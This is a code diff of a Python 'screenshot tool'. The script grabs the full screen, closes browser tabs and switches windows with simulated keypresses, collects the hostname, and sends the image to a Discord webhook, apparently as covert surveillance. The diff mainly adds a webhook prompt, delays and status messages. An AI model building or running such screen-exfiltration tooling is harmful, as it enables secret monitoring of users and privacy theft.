@@ -14,10 +14,19 @@ except ImportError as exception:
     missing_packages = [pkg for pkg in str(exception).split() if "'" in pkg]
     for package in missing_packages:
         print(f"The {package} package is not installed. Please install it to use this screenshot tool:\n" + " pip install " + package)
+        time.sleep(3000)
         quit()
 
 #discord webhook goes here
-DISCORD_WEBHOOK_URL = "input discord webhook here"
+print("if you need help, enter \"help\" into the input below.")
+DISCORD_WEBHOOK_URL = input("Please input discord webhook: ")
+if DISCORD_WEBHOOK_URL == "help":
+    print("Please check out the following website\n https://docs.netapp.com/us-en/cloudinsights/task_webhook_example_discord.html#discord-setup")
+    print("(Double click the link and press ctrl + c)")
+    time.sleep(20)
+    quit()
+
+DISCORD_WEBHOOK_URL = str(DISCORD_WEBHOOK_URL)
 #to get discord webhook url, go to server settings --> integrations --> webhooks --> webhook name --> Copy Webhook Url
 
 starting_time = time.time()
@@ -49,13 +58,14 @@ def take_image():
     image = ImageGrab.grab()
     now = datetime.now()
     #keybinds
-    keyboard.press_and_release('f11')
     time.sleep(0.1)
     #closes tab
     keyboard.press_and_release('ctrl+w')
     time.sleep(0.2)
     keyboard.press_and_release('ctrl+w')
     time.sleep(0.2)
+    keyboard.press_and_release('f11')
+    time.sleep(0.1)
     keyboard.press_and_release('alt+tab')
 
     #uses byte stream to save and send image to discord
@@ -77,7 +87,6 @@ def take_image():
     else:
         #if url is invalid, runtime should be about 
         print("Discord Webhook Url is Invalid, please provide a valid one :) ")
-        print("Program Quit")
 
         #calculate th3 runtime
         global end_time, runtime
@@ -86,6 +95,8 @@ def take_image():
         runtime = int(round(runtime))
 
         print("Total runtime: About " + str(runtime) + " seconds")
+        print("Quitting program...")
+        time.sleep(3.5)
         quit()
 
     hostname = socket.gethostname()
@@ -96,6 +107,7 @@ def take_image():
 
 def main(array):
     global count
+    print("Loading Packages...")
     time.sleep(6)
     for num in array:
         take_image()
@@ -110,6 +122,8 @@ def main(array):
             runtime = int(round(runtime))
 
             print("Total runtime: About " + str(runtime) + " seconds")
+            print("Qutting Program...")
+            time.sleep(5)
             print("Program Quit")
             quit()
         else:
